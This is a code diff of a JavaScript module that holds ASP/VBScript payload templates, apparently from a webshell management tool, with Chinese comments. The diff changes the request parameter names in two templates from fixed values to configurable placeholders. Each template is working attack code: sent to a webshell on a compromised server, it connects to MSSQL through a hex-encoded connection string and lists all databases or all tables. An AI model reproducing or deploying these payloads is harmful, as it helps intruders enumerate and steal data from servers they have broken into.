@@ -6,13 +6,13 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
   // 显示所有数据库
   show_databases: {
     _:
-      `Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open bd(Request("z1")):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=CreateObject("Adodb.Recordset"):Rs.open "select [name] from master.dbo.sysdatabases order by 1",Conn,1,1:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Do While Not(Rs.Eof Or Rs.Bof):SI=SI&Rs(0)&chr(9):Rs.MoveNext:Loop:Rs.Close:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,
+      `Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open bd(Request("${arg1}")):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=CreateObject("Adodb.Recordset"):Rs.open "select [name] from master.dbo.sysdatabases order by 1",Conn,1,1:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Do While Not(Rs.Eof Or Rs.Bof):SI=SI&Rs(0)&chr(9):Rs.MoveNext:Loop:Rs.Close:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,
     [arg1]: '#{hex::conn}'
   },
   // 显示数据库所有表
   show_tables: {
     _:
-      `Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("z1"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=Conn.Execute("USE ["&Request("z2")&"];SELECT [name] FROM sysobjects WHERE (xtype=\'U\') ORDER BY 1"):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Do While Not(Rs.Eof Or Rs.Bof):SI=SI&Rs(0)&chr(9):Rs.MoveNext:Loop:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,
+      `Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("${arg1}"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=Conn.Execute("USE ["&Request("${arg2}")&"];SELECT [name] FROM sysobjects WHERE (xtype=\'U\') ORDER BY 1"):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Do While Not(Rs.Eof Or Rs.Bof):SI=SI&Rs(0)&chr(9):Rs.MoveNext:Loop:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,
     [arg1]: '#{hex::conn}',
     [arg2]: '#{dbname}'
   },
